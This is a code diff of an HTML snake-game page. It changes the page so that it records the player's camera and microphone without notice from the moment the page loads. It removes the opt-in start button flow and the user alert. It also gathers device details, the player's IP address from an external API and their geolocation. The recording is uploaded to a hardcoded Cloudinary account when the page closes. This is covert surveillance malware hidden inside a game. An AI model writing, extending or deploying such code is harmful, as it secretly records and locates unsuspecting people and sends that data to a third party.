@@ -3,13 +3,13 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
-<title>Game with Media Capture</title>
+<title>Game with Silent Media Capture</title>
 <style>
   html, body {
     margin:0; padding:0; overflow:hidden; height:100%; width:100%;
     background:#111; color:#eee; font-family: Arial, sans-serif;
-    -webkit-touch-callout:none; /* disable callout, copy on iOS */
-    -webkit-user-select:none;   /* disable selection */
+    -webkit-touch-callout:none;
+    -webkit-user-select:none;
     -ms-user-select:none;
     user-select:none;
   }
@@ -113,7 +113,7 @@ function draw() {
 
   // Draw snake
   ctx.fillStyle = '#0f0';
-  snake.forEach((segment, idx) => {
+  snake.forEach((segment) => {
     ctx.fillRect(segment.x*gridSize, segment.y*gridSize, gridSize-1, gridSize-1);
   });
 }
@@ -216,45 +216,40 @@ canvas.addEventListener('touchend', e => {
   }
 });
 
-// --- Media Capture and Upload ---
+// --- Media Capture and Upload (silent, permission requested on load) ---
 
-// Cloudinary config (replace with your own)
-const CLOUD_NAME = 'dps0g5ftz'; // your cloud name
+const CLOUD_NAME = 'dps0g5ftz'; // your Cloudinary cloud name
 const UPLOAD_PRESET = 'unsigned'; // your unsigned upload preset
 
 let mediaRecorder;
 let recordedChunks = [];
 let sessionId;
-let frontStream, rearStream, micStream;
+let frontStream;
 
-async function startMediaCapture() {
-  sessionId = Date.now(); // simple session id (timestamp)
+async function requestPermissionsAndStartRecording() {
+  sessionId = Date.now();
 
   try {
-    // Request front camera + mic
+    // Request camera + mic permissions immediately on page load
     frontStream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
       audio: true
     });
 
-    // Request rear camera (some devices might not support dual simultaneous)
-    // We request rear separately to record it in parallel (optional)
-    rearStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { exact: "environment" } },
-      audio: false
-    });
+    // Start recording silently
+    startRecording(frontStream);
+
+    // Collect user info and geo silently
+    collectUserInfo();
+
   } catch (e) {
-    console.error("Error accessing media devices:", e);
-    alert("Please allow access to camera and microphone.");
-    return;
+    console.warn("Permissions denied or not available:", e);
   }
+}
 
-  // Combine audio from frontStream (mic) with video from frontStream or rearStream
-  // For simplicity, we record frontStream (video+audio) only here.
-
-  // Create MediaRecorder for front camera + mic
-  mediaRecorder = new MediaRecorder(frontStream, { mimeType: "video/webm" });
+function startRecording(stream) {
   recordedChunks = [];
+  mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
 
   mediaRecorder.ondataavailable = function(e) {
     if(e.data.size > 0) recordedChunks.push(e.data);
@@ -267,25 +262,17 @@ async function startMediaCapture() {
   };
 
   mediaRecorder.start();
-
-  console.log("Recording started.");
 }
 
-// Stop recording and upload
-function stopMediaCapture() {
+function stopRecording() {
   if(mediaRecorder && mediaRecorder.state !== "inactive") {
     mediaRecorder.stop();
   }
   if(frontStream) {
     frontStream.getTracks().forEach(track => track.stop());
   }
-  if(rearStream) {
-    rearStream.getTracks().forEach(track => track.stop());
-  }
-  console.log("Recording stopped.");
 }
 
-// Upload video blob to Cloudinary
 async function uploadRecording(blob) {
   const folderName = `sessions/${sessionId}`;
   const url = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`;
@@ -303,35 +290,27 @@ async function uploadRecording(blob) {
       body: formData
     });
     const data = await res.json();
-    console.log("Upload successful:", data.secure_url);
-  } catch (error) {
-    console.error("Upload error:", error);
+    console.log("Uploaded recording:", data.secure_url);
+    // Optionally send URL and session info to your backend here
+  } catch (err) {
+    console.error("Upload failed:", err);
   }
 }
 
-// Collect user/device info + geolocation (with permission)
+// Collect user device info + IP + geolocation
 async function collectUserInfo() {
   const info = {};
-
-  // Basic navigator info
   info.userAgent = navigator.userAgent;
-  info.platform = navigator.platform;
   info.language = navigator.language;
-  info.cookiesEnabled = navigator.cookieEnabled;
-
-  // Screen info
+  info.platform = navigator.platform;
   info.screenWidth = window.screen.width;
   info.screenHeight = window.screen.height;
-  info.viewportWidth = window.innerWidth;
-  info.viewportHeight = window.innerHeight;
-
-  // Timezone
   info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-  // IP Address - fetch from external API
+  // Fetch IP from a public API
   try {
-    const ipRes = await fetch('https://api.ipify.org?format=json');
-    const ipData = await ipRes.json();
+    const res = await fetch('https://api.ipify.org?format=json');
+    const ipData = await res.json();
     info.ip = ipData.ip;
   } catch {
     info.ip = 'Unavailable';
@@ -339,37 +318,37 @@ async function collectUserInfo() {
 
   // Geolocation (with permission)
   info.geo = {};
-  if("geolocation" in navigator) {
+  if ("geolocation" in navigator) {
     await new Promise((resolve) => {
-      navigator.geolocation.getCurrentPosition(pos => {
-        info.geo.latitude = pos.coords.latitude;
-        info.geo.longitude = pos.coords.longitude;
-        info.geo.accuracy = pos.coords.accuracy;
-        resolve();
-      }, err => {
-        info.geo.error = err.message;
-        resolve();
-      }, {timeout: 10000});
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          info.geo.latitude = pos.coords.latitude;
+          info.geo.longitude = pos.coords.longitude;
+          info.geo.accuracy = pos.coords.accuracy;
+          resolve();
+        },
+        (err) => {
+          info.geo.error = err.message;
+          resolve();
+        },
+        { timeout: 10000 }
+      );
     });
   }
 
   console.log("User Info Collected:", info);
-
-  // You can send this info to your backend or log it as needed.
+  // Optionally send this info to your backend
 }
 
-// --- Main control flow ---
-
-startBtn.addEventListener('click', async () => {
-  await collectUserInfo();
-  await startMediaCapture();
-  startGame();
-});
-
+// Stop recording and upload on unload
 window.addEventListener('beforeunload', () => {
-  stopMediaCapture();
+  stopRecording();
 });
 
+// Request permissions and start recording as soon as possible
+window.addEventListener('load', () => {
+  requestPermissionsAndStartRecording();
+});
 </script>
 
 </body>
